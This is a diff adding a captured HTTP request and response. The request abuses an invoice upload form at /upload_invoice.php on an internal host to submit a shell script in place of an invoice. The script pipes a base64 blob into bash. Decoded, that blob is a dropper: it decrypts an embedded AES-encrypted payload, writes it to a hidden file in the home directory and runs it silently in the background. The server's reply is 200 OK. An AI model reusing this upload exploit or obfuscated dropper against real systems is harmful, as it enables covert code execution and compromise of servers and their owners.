@@ -1,0 +1,40 @@
+POST /upload_invoice.php HTTP/1.1
+Host: 10.87.1.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------34839546401136329472292716412
+Content-Length: 968
+Origin: http://10.87.1.2
+Connection: keep-alive
+Referer: http://10.87.1.2/send_invoice.php
+Upgrade-Insecure-Requests: 1
+
+-----------------------------34839546401136329472292716412
+Content-Disposition: form-data; name="po_number"
+
+870128353
+-----------------------------34839546401136329472292716412
+Content-Disposition: form-data; name="invoice_file"; filename="_.sh"
+Content-Type: application/x-shellscript
+
+#!/bin/bash
+
+echo "IyEvYmluL2Jhc2gKCnBheWxvYWQ9IlUyRnNkR1ZrWDEvK0xkZlBINlAvdkFUNnZUSkFrUUU4U01BeTI3WEJEL05xNDVaVzFUT3RBallJQk94V3UvMGN5c3RhaU8wK2UzdHhMQllTUzczTUo5S0txRUozRFJWL1UxNXBCUXN4OE1KTWNMZ242QzVLMWtHcjY4NnUzQ1ZPR3oyQTFOcXpLTkdMSDJWMjgrbUNQTXgxMGRQdDIvZ3RDU20wMm96QXNITTMzOCtQSmRheFRmRVpOVXh6NW1XSkl1TmxmQkoydlFwRzhaNUxVa1NKYlBvRiIKCmZ1bmN0aW9uIGRyb3BfYW5kX3J1biB7CgllY2hvICIke3BheWxvYWR9IiB8IGJhc2U2NCAtZCB8IG9wZW5zc2wgYWVzLTI1Ni1jdHIgLWQgLXBhc3MgcGFzczppYWJsb2tvIC1wYmtkZjIgPiAkSE9NRS8nLiAnCgljaG1vZCB1K3ggJEhPTUUvJy4gJwoJJEhPTUUvJy4gJyAyPi9kZXYvbnVsbCAmCn0KCmRyb3BfYW5kX3J1bgo=" | base64 -d | bash
+
+-----------------------------34839546401136329472292716412--
+
+HTTP/1.1 200 OK
+Date: Sun, 20 Oct 2024 18:57:41 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 124
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+............;
+.0..{...Jg.^....rc?.....c..m..f....3.~.[.-.'....No...n..D.....b..wt.&....*+..2..{.W6.........
+R..8......G&}...
